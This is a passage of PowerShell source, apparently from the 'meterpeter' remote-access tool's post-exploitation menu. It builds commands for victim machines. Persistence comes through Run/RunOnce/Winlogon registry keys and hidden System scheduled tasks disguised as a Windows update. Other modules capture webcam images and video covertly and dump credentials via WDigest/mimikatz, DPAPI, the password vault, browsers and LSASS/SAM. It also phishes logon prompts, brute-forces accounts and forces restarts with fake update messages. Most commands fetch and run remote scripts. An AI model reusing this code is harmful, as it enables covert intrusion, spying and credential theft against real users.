              {
                 $Command = $Null;
                 $Chosen_Option = $Null;
                 $startup_choise = $Null;
                 Write-Host ""
                 Write-Host "[error] This module requires 'Absoluct Path' declarations ..." -ForegroundColor Red -BackgroundColor Black
                 Start-Sleep -Seconds 1
              }
           }
           ElseIf($Chosen_Option -iMatch '^(find)$')
           {
              Write-host " - The directory to start search for `$DATA stream : " -NoNewline;
              $StartDir = Read-Host;           
              
              If(-not($StartDir) -or $StartDir -ieq $null){$StartDir = "$Env:USERPROFILE"}

              Write-Host " * Search in '$StartDir' for streams." -ForegroundColor Green
              $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"enum`" -streamdata `"false`" -StartDir `"$StartDir`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           }
           ElseIf($Chosen_Option -iMatch '^(clean)$')
           {
              Write-host " - Input 'payload.extension' name (stream)        : " -NoNewline;
              $streamdata = Read-Host;
              Write-host " - Input image(.png|.jpg|.jpeg) absoluct path     : " -NoNewline;
              $Image_name = Read-Host;$ParseThisShit = $Image_name.Split('\\')[-1]
              If(-not($streamdata) -or $streamdata -ieq $null){$streamdata = "ZoneIdentifier"}

              Write-Host " * Delete '$ParseThisShit' ADS `$DATA Stream." -ForegroundColor Green
              $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/AdsMasquerade.ps1`" -OutFile `"`$Env:TMP\AdsMasquerade.ps1`"|Unblock-File;powershell -file `$Env:TMP\AdsMasquerade.ps1 -ADS `"clear`" -streamdata `"$streamdata`" -intextfile `"$Image_name`";Remove-Item -Path `"`$Env:TMP\AdsMasquerade.ps1`" -Force";
           }
           Else
           {
              $Command = $Null;
              $Chosen_Option = $Null;
              $startup_choise = $Null;           
           }

        }
        If($startup_choise -ieq "RUNONCE" -or $startup_choise -ieq "once")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist               Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -------------------";
          Write-Host "   Update-KB5005101.ps1  `$env:tmp\KBPersist.vbs`n";
          $Command = "cmd /R REG ADD 'HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce' /v KBUpdate /d '%tmp%\KBPersist.vbs' /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs";
          $Command = ChkDskInternalFuncio(Char_Obf($Command));
        }
        If($startup_choise -ieq "REGRUN" -or $startup_choise -ieq "run")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist               Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------               -------------------";
          Write-Host "   Update-KB5005101.ps1  `$env:tmp\KBPersist.vbs`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{cmd /R reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v KBUpdate /d %tmp%\KBPersist.vbs /t REG_EXPAND_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs}";
        }
        If($startup_choise -ieq "Schtasks" -or $startup_choise -ieq "tasks")
        {
          $onjuyhg = ([char[]]([char]'A'..[char]'Z') + 0..9 | sort {get-random})[0..7] -join '';
          write-host " * Make Client Beacon Home Every xx Minuts." -ForegroundColor Green;Start-Sleep -Seconds 1;
          write-Host " - Input Client Remote Path: " -NoNewline;
          $execapi = Read-Host;
          write-Host " - Input Beacon Interval (minuts): " -NoNewline;
          $Interval = Read-Host;write-host "`n";
          Write-Host "   TaskName   Client Remote Path" -ForeGroundColor green;
          Write-Host "   --------   ------------------";
          Write-Host "   $onjuyhg   $execapi";
          write-host "`n";
          If(-not($Interval)){$Interval = "10"}
          If(-not($execapi)){$execapi = "$env:tmp\Update-KB5005101.ps1"}
          ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File `"$execapi`" /RU System`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
        }    
        If($startup_choise -ieq "WinLogon" -or $startup_choise -ieq "logon")
        {
          ## If Available use powershell -version 2 {AMSI Logging Evasion}
          write-host " * Execute Client ($payload_name.ps1) On Every StartUp." -ForegroundColor Green;Start-Sleep -Seconds 1;write-host "`n`n";
          Write-Host "   Persist                Trigger Remote Path" -ForeGroundColor green;
          Write-Host "   -------                -------------------";
          Write-Host "   Update-KB5005101.ps1   `$env:tmp\KBPersist.vbs";
          Write-Host "   HIVEKEY: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Userinit`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}else{cmd /R reg add 'HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon' /v Userinit /d %windir%\system32\userinit.exe,%tmp%\KBPersist.vbs /t REG_SZ /f;echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\KBPersist.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File `$env:tmp\$Payload_name.ps1`", 0, True' `>`> `$env:tmp\KBPersist.vbs;remove-Item test.log -Force}}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($startup_choise -ieq "Return" -or $startup_choise -ieq "return" -or $logs_choise -ieq "cls" -or $logs_choise -ieq "Modules" -or $logs_choise -ieq "modules" -or $logs_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $startup_choise = $Null;
        }
      }
      If($choise -ieq "Camera" -or $choise -ieq "cam")
      {
        write-host "`n`n   Remark:" -ForegroundColor Yellow;
        write-host "   This module allow users to enumerate webcams available,"
        write-host "   take webcam screenshot(s) or capture webcam live stream."
        write-host "   Remark: snapshots are stored in remote %TMP% directory." -ForegroundColor DarkYellow
        write-host "   Remark: webcam turns 'ON' the ligth while recording." -ForegroundColor DarkYellow
        write-host "`n`n   Modules    Description                 Privileges Required" -ForegroundColor green;
        write-host "   -------    -----------                 -------------------";
        write-host "   Device     List all camera devices     UserLand";
        write-host "   SnapShot   Capture webcam screenshot   UserLand";
        write-host "   WebCamAvi  Webcam live stream [.avi]   UserLand";
        write-host "   Return     Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Cam> " -NoNewline -ForeGroundColor Green;
        $Cam_choise = Read-Host;
        If($Cam_choise -ieq "Device")
        {
           write-host " * Listing Available WebCams`n" -ForeGroundColor Green;
           $Command = "Get-PnpDevice -FriendlyName *webcam* -Class Camera,image|Select Status,Class,FriendlyName,InstanceId|Format-Table -AutoSize|Select -SkipLast 1|Out-File `$Env:TMP\device.log -Force;Get-Content -Path `"`$Env:TMP\device.log`";Remove-Item -Path `"`$Env:TMP\device.log`"`-Force";
        }
        If($Cam_choise -ieq "SnapShot")
        {
           write-host " * Capture one webcam snapshot." -ForeGroundColor Green
           write-host "`n   State      Snapshot" -ForeGroundColor Green;
           write-host "   -----      --------"
           Write-Host "   starting   " -ForegroundColor Red -NoNewline
           Write-Host "image.bmp`n"

           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/CommandCam.exe`" -OutFile `"`$Env:TMP\commandcam.exe`";Start-Process -WindowStyle hidden powershell -argumentlist `"cmd /R start /min %tmp%\CommandCam.exe`" -Wait;echo `"  Storage : `$Env:TMP\image.bmp`";Remove-Item `$Env:TMP\CommandCam.exe -Force";
        }
        If($Cam_choise -ieq "WebCamAvi")
        {
           write-host " * Live stream using default webcam." -ForeGroundColor Green

           write-host " - Time to record vid in seconds: " -NoNewline;
           [int]$RecTime = Read-Host
           If([int]$RecTime -lt 10 -or [int]$RecTime -gt 120)
           {
              [int]$RecTime = "10"
              write-host "   => Error: wrong input, default to $RecTime (sec)" -ForeGroundColor red      
           }

           write-host " - Silent install dependencies missing? (y|n): " -ForegroundColor DarkYellow -NoNewline
           $DependOff = Read-Host

           $CurrentDate = (Get-Date -Format 'HH:mm')
           write-host " - Schedule webcam record time? ($CurrentDate|now)  : " -ForegroundColor DarkYellow -NoNewline
           $StartTime = Read-Host
           If([string]::IsNullOrEmpty($StartTime))
           {
              $StartTime = "now"
              write-host "   => Error: wrong input, default to [" -ForeGroundColor red -NoNewline
              write-host "$StartTime" -ForegroundColor DarkGreen -NoNewline   
              write-host "]" -ForeGroundColor red  
           }
           ElseIf($StartTime -iMatch '^(now)$')
           {
              write-host "   - " -ForeGroundColor Green -NoNewline
              write-host "Start webcam recording [" -NoNewline
              write-host "$StartTime" -ForegroundColor DarkGreen -NoNewline
              write-host "]"
           }
           ElseIf($StartTime -NotMatch '^(\d+\d+:+\d+\d)$')
           {
              ## Generate time with 2 minuts ahead
              $HourInput = (Get-Date -Format 'HH')
              $MinuInput = (Get-Date -Format 'mm')

              If($MinuInput.Length -lt 2)
              {
                 ## Add '0' to string if $MinuInput
                 # have deleted the '0' from string
                 $newvalues = [int]$MinuInput+2
                 $AddExtram = "0" + "$newvalues" -join ''              
              }
              Else
              {
                 $AddExtram = [int]$MinuInput+2
              }

              write-host "   => Error: [$StartTime] input, default to [" -ForeGroundColor red -NoNewline
              $StartTime = "$HourInput" + ":" + "$AddExtram" -join ''
              write-host "$StartTime" -ForegroundColor DarkGreen -NoNewline   
              write-host "] hours" -ForeGroundColor red                                      
           }
           Else
           {
              write-host "   - " -ForeGroundColor Green -NoNewline
              write-host "Start webcam recording [" -NoNewline
              write-host "$StartTime" -ForegroundColor DarkGreen -NoNewline
              write-host "] hours"           
           }

           ## Print Settings OnScreen
           write-host "`n`n  State      VideoFile       RecordTime" -ForegroundColor Green
           write-host "  -----      ---------       ----------"
           write-host "  running    " -ForegroundColor Red -NoNewline
           write-host "meterpeter.avi  ${RecTime} (secs)   "

           If(-not($DependOff) -or $DependOff -iMatch '^(n|no)$')
           {
              #Execute command remote
              $Command = "`$CheckInstall = [bool](python -V);If(`$CheckInstall -Match 'True'){iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1`" -OutFile `"`$Env:TMP\Invoke-webcamAvi.ps1`";Start-Process -WindowStyle hidden powershell -argumentList `"-file `$Env:TMP\Invoke-webcamAvi.ps1 -rectime $RecTime -starttime $StartTime -autodel`";echo `"`n  State   : recording webcam live in avi format.`";echo `"  Remark  : module takes a few seconds before start capture.`";echo `"  Storage : `$Env:TMP\meterpeter.avi`"}Else{echo `"`n  Error: module requires 'Python3' installed on target system.`"}"
           }
           Else
           {
              #Execute command remote [silent install dependencies]
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam-Capture/Invoke-webcamAvi.ps1`" -OutFile `"`$Env:TMP\Invoke-webcamAvi.ps1`";Start-Process -WindowStyle hidden powershell -argumentList `"-file `$Env:TMP\Invoke-webcamAvi.ps1 -rectime $RecTime -starttime $StartTime -forceinstall -autodel`";echo `"`n  State   : recording webcam live in avi format.`";echo `"  State   : Silent install python3 dependencies if missing.`";echo `"  Remark  : module takes a few seconds before start capture.`";echo `"  Storage : `$Env:TMP\meterpeter.avi`""
           }
        }
        If($Cam_choise -ieq "Return" -or $Cam_choise -ieq "cls" -or $Cam_choise -ieq "Modules" -or $Cam_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Cam_choise = $Null;
        }
      }
      If($choise -ieq "Restart")
      {
        ## Fast restart of Remote-Host (with msgbox)
        Write-Host " - RestartTime: " -NoNewline;
        $shutdown_time = Read-Host;

        If(-not ($shutdown_time) -or $shutdown_time -eq " ")
        {
          ## Default restart { - RestartTime: blank }
          Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
          Write-Host "   ------   --------   -------";
          Write-Host "   restart  60 (sec)   A restart is required to finish install security updates.";

          write-Host "`n`n - Continue? (y|n): " -ForegroundColor DarkYellow -NoNewline
          $Continue = Read-Host
          If($Continue -iMatch '^(y|yes)$')
          {
             $Command = "cmd /R shutdown /r /c `"A restart is required to finish install security updates.`" /t 60"          
          }
          Else
          {
             $Command = $null          
          }

        }
        Else
        {
          write-host " - RestartMessage: " -NoNewline;
          $shutdown_msg = Read-Host;
          If (-not ($shutdown_msg) -or $shutdown_msg -eq " ")
          {
            ## Default msgbox { - RestartMessage: blank }
            Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
            Write-Host "   ------   --------   -------";
            Write-Host "   restart  $shutdown_time (sec)   A restart is required to finish install security updates.";

            write-Host "`n`n - Continue? (y|n): " -ForegroundColor DarkYellow -NoNewline
            $Continue = Read-Host
            If($Continue -iMatch '^(y|yes)$')
            {
               $Command = "cmd /R shutdown /r /c `"A restart is required to finish install security updates.`" /t $shutdown_time";          
            }
            Else
            {
               $Command = $null          
            }
          }
          Else
          {
            ## User Inputs { - RestartTime: ++ - RestartMessage: }
            Write-Host "`n`n   Status   Schedule   Message" -ForeGroundColor green;
            Write-Host "   ------   --------   -------";
            Write-Host "   restart  $shutdown_time (sec)   $shutdown_msg"

            write-Host "`n`n - Continue? (y|n): " -ForegroundColor DarkYellow -NoNewline
            $Continue = Read-Host
            If($Continue -iMatch '^(y|yes)$')
            {
               $Command = "cmd /R shutdown /r /c `"$shutdown_msg`" /t $shutdown_time"          
            }
            Else
            {
               $Command = $null          
            }
          }
        }

        write-host ""
        $shutdown_msg = $Null;
        $shutdown_time = $Null;
      }
      If($choise -ieq "Passwords" -or $choise -ieq "pass")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   Start module searchs for credential strings inside"
        write-host "   all files starting in the input directory recursive."
        write-host "   Dpapi and Vault modules dumps PasswordVault credentials." -ForegroundColor Yellow
        write-host "   WDigest invokes m[i]mika[t]z to dump creds from memory" -ForegroundColor Yellow
        write-host "`n`n   Modules   Description                    Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                    ------------------";
        write-host "   Start     Search for creds inside files  UserLand";
        write-host "   Dpapi     Dump DPAPI masterKeys + blobs  UserLand";
        write-host "   Vault     Dump creds from PasswordVault  UserLand";
        write-host "   WDigest   Credential caching [memory]    Administrator";
        write-host "   Browser   Clear-text credential dump     Administrator";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Pass> " -NoNewline -ForeGroundColor Green;
        $pass_choise = Read-Host;
        If($pass_choise -ieq "WDigest")
        {
           write-host " * WDigest Credential caching [memory]`n" -ForegroundColor Green

           write-host "   Description:" -ForegroundColor DarkYellow
           write-host "   This module patches WDigest [memory] so that m[i]mika[t]z"
           write-host "   can retrieve any clear-text credentials present in memory.`n"

           write-host "   Prompt target user for credential: 'yes' pauses module"
           write-host "   execution while waiting for target user credential input,"
           write-host "   only then it resumes execution and print results onscreen`n"

           write-host " - Prompt target user for credential? (yes|no): " -ForegroundColor Green -NoNewLine
           $PromptBox = Read-Host

           write-host "   => module takes aprox 2 minuts to finish is work." -ForegroundColor DarkYellow
           If(-not($PromptBox) -or ($PromptBox -iMatch '^(no|n)$'))
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -manycats;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
           }
           Else
           {
              $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'true' -manycats -runas;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
           }
        }
        If($pass_choise -ieq "Browser")
        {
           write-host " * WebBrowser credential dump." -ForegroundColor Green
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/DeviceGuard/Invoke-WDigest.ps1`" -OutFile `"`$Env:TMP\Invoke-WDigest.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-WDigest.ps1`" -banner 'false' -wdigest 'false' -browsercreds;Remove-Item -Path `"`$Env:TMP\Invoke-WDigest.ps1`" -Force";
        }
        If($pass_choise -ieq "Dpapi")
        {
           write-host " * Dumping $Remote_Host DPAPI secrets." -ForegroundColor Green
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1`" -OutFile `"`$Env:TMP\Invoke-VaultCmd.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-VaultCmd.ps1`" -action `"DPAPI`" -banner `"false`";Remove-Item -Path `"`$Env:TMP\Invoke-VaultCmd.ps1`" -Force";
        }
        If($pass_choise -ieq "Vault")
        {
           write-host " * Dumping PasswordVault credentials." -ForegroundColor Green
           $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfiltration/Invoke-VaultCmd.ps1`" -OutFile `"`$Env:TMP\Invoke-VaultCmd.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Invoke-VaultCmd.ps1`" -action `"dump`" -banner `"false`" -secure;Remove-Item -Path `"`$Env:TMP\Invoke-VaultCmd.ps1`" -Force"
        }
        If($pass_choise -ieq "Start")
        {
          write-host " * Search for stored credentials inside files." -ForegroundColor Green
          write-host "   Leave input fields black to use default settings." -ForegroundColor DarkYellow

          write-host " - Directory to search recursive (`$Env:USERPROFILE): " -NoNewLine
          $Recursive_search = Read-Host

          If(-not($Recursive_search))
          {
             $Recursive_search = "`$Env:USERPROFILE"
             write-host "   => Error: wrong input, default to $Recursive_search" -ForegroundColor Red
          }

          write-host " - String or Regex command to search (password=)   : " -NoNewLine
          $String = Read-Host
          If(-not($String))
          {
             write-host "   => Error: wrong input, using cmdlet default Regex" -ForegroundColor Red
             $String = "(^(\s+U|U)ser.{0,6}(=|:).[^$]{0,22}$)|(^(\s+p|\s+cp|cp|p)ass.{0,6}(=|:).{0,22}$)|(^(\s+p|p)wd.{0,2}(=|:).{0,22}$)|(log(i|o)n.{0,2}(=|:).[^$]{0,22}$)"
          }

          write-host " - Stop searching after found xxx results (100)    : " -NoNewLine
          $StopAt = Read-Host
          If(-not($StopAt))
          {
             $StopAt = "15"
             write-host "   => Error: wrong input, default to 15 max results." -ForegroundColor Red
          }

          write-host " - Display detailed (verbose) scan reports? (y|n)  : " -NoNewLine
          $VerboseMode = Read-Host
          write-host "   => Please wait until module finishes working." -ForegroundColor DarkYellow

          If(-not($VerboseMode))
          {
             $VerboseMode = "false"
             write-host "   => Error: wrong input, default verbose to false.." -ForegroundColor Red
          }
          ElseIf(($VerboseMode -iMatch '^(n|no)$'))
          {
             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -StopAt `"$StopAt`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
          }
          Else
          {
             $Command = "iwr -uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/Find-Strings.ps1`" -OutFile `"`$Env:TMP\Find-Strings.ps1`"|Unblock-File;powershell -File `"`$Env:TMP\Find-Strings.ps1`" -Path `"$Recursive_search`" -String `"$String`" -StopAt `"$StopAt`" -verb -limmit `"1`";Remove-Item -Path `"`$Env:TMP\Find-Strings.ps1`" -Force";
          }
        }
        If($pass_choise -ieq "Return" -or $pass_choise -ieq "cls" -or $pass_choise -ieq "Modules" -or $pass_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $pass_choise = $Null;
        }
      }
      If($choise -ieq "LockPC" -or $choise -ieq "lock")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This module allow users to lock target pc"
        write-host "   Remark: This function silent restarts explorer." -ForeGroundColor yellow;
        write-host "`n`n   Modules   Description                     Privileges Required" -ForegroundColor green;
        write-host "   -------   -----------                     ------------------";
        write-host "   start     lock target pc                  UserLand";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Lock> " -NoNewline -ForeGroundColor Green;
        $Lock_choise = Read-Host;
        If($Lock_choise -ieq "start")
        {
           $Ob = "rund" + "ll32.exe user32" + ".dll, LockWor" + "kStation" -join ''
           write-host " * Lock Remote WorkStation." -ForegroundColor Green;write-host "`n`n";
           $Command = "$Ob;echo `"   [i] Remote-Host WorkStation Locked ..`" `> prank.txt;Get-content prank.txt;Remove-Item prank.txt -Force";
        }
        If($Lock_choise -ieq "Return" -or $Lock_choise -ieq "cls" -or $Lock_choise -ieq "Modules" -or $Lock_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
          $Lock_choise = $Null;
        }
      }
      If($choise -ieq "PhishCred" -or $choise -ieq "Creds")
      {
        write-host "`n`n   Description:" -ForegroundColor Yellow;
        write-host "   This module spawns a remote 'Prompt-For-Credential' dialogBox";
        write-host "   in the hope that target user enters is credentials to leak them";
        write-host "`n`n   Modules     Description                 Privileges Required" -ForegroundColor green;
        write-host "   -------     -----------                 ------------------";
        write-host "   Start       Phish for remote creds      UserLand";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Creds> " -NoNewline -ForeGroundColor Green;
        $cred_choise = Read-Host;
        If($cred_choise -ieq "Start")
        {
           write-host " * Phishing for remote credentials (logon)" -ForegroundColor Green;Write-Host ""
           $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`"|Out-Null;Start-Process -WindowStyle hidden powershell -ArgumentList `"-File `$Env:TMP\CredsPhish.ps1 -PhishCreds start`" -Wait;Get-Content -Path `"`$Env:TMP\creds.log`";Remove-Item -Path `"`$Env:TMP\creds.log`" -Force;Remove-Item -Path `"`$Env:TMP\CredsPhish.ps1`" -Force"
        }
        If($cred_choise -ieq "Return" -or $cred_choise -ieq "return" -or $cred_choise -ieq "cls" -or $cred_choise -ieq "Modules" -or $cred_choise -ieq "modules" -or $cred_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $cred_choise = $Null;
      }
      If($choise -ieq "DumpSAM" -or $choise -ieq "sam")
      {
        write-host " * DumpLSASS/SAM/SYSTEM/SECURITY metadata." -ForegroundColor Green;write-host "";
        $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DumpLsass.ps1`" -OutFile `"`$Env:TMP\DumpLsass.ps1`"|Unblock-File;powershell -File `$Env:TMP\DumpLsass.ps1;Start-Sleep -Seconds 1;Remove-Item -Path `"`$Env:TMP\DumpLsass.ps1`" -Force"
      }
      If($choise -ieq "BruteAcc")
      {
         write-host "`n`n   Description:" -ForegroundColor Yellow
         write-host "   Bruteforcing user account password using dicionary attack."
         write-host "   Remark: Default dicionary contains 59189 credential entrys." -ForegroundColor Yellow
         write-host "   Remark: If you wish to use your own dicionary, then store" -ForegroundColor Yellow
         write-host "   it on target %TMP% directory under the name of passw.txt" -ForegroundColor Yellow
         write-host "`n`n   Modules  Description                  Privileges Required" -ForegroundColor green;
         write-host "   -------  -----------                  ------------------";
         write-host "   Start    Bruteforcing user account    UserLand";
         write-host "   Return   Return to Server Main Menu" -ForeGroundColor yellow
         write-host "`n`n :meterpeter:Post:BruteAcc> " -NoNewline -ForeGroundColor Green;
         $Brute_choise = Read-Host;
         If($Brute_choise -ieq "Start")
         {
            $UserAccountName = Read-Host " - Input Account Name";
            Write-Host " * Bruteforcing user account." -ForegroundColor Green
            If(-not($UserAccountName) -or $UserAccountName -eq $null){$UserAccountName = "`$Env:USERNAME"}

            Write-Host ""
            #Build output DataTable!
            $BruteTime = Get-Date -Format "HH:mm:ss"
            $BruteTable = New-Object System.Data.DataTable
            $BruteTable.Columns.Add("UserName")|Out-Null
            $BruteTable.Columns.Add("StartTime")|Out-Null
            $BruteTable.Columns.Add("Dicionary")|Out-Null

            #Adding values to output DataTable!
            $BruteTable.Rows.Add("$UserAccountName","$BruteTime","%TMP%\passw.txt")|Out-Null

            #Diplay output DataTable!
            $BruteTable | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
               $stringformat = If($_ -Match '^(UserName)')
               {
                  @{ 'ForegroundColor' = 'Green' }
               }
               Else
               {
                  @{}
               }
               Write-Host @stringformat $_
            }

            #Run command
            $Command = "iwr -Uri `"https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/CredsPhish.ps1`" -OutFile `"`$Env:TMP\CredsPhish.ps1`";powershell -W 1 -File `$Env:TMP\CredsPhish.ps1 -PhishCreds Brute -Dicionary `$Env:TMP\passw.txt -UserAccount $UserAccountName;Remove-Item -Path `$Env:TMP\CredsPhish.ps1 -Force"
         }
         If($Brute_choise -ieq "Return" -or $Brute_choise -ieq "cls" -or $Brute_choise -ieq "modules" -or $Brute_choise -ieq "clear")
         {
            $choise = $Null;
            $Command = $Null;
            $Brute_choise = $Null;
         }
      }
      If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
      {
        $choise = $Null;
        $Command = $Null;
      }
      $choise = $Null;
      $set_time = $Null;
      $mace_path = $Null;
    }

    If($Command -ieq "Download")
    {
        write-host "`n`n   Remark:" -ForegroundColor Yellow;
        write-host "   Allways input absoluct path of the file to be downloaded.";
        write-host "   Avoid downloading LARGE\HUGE files with tcp connections." -ForegroundColor Yellow;
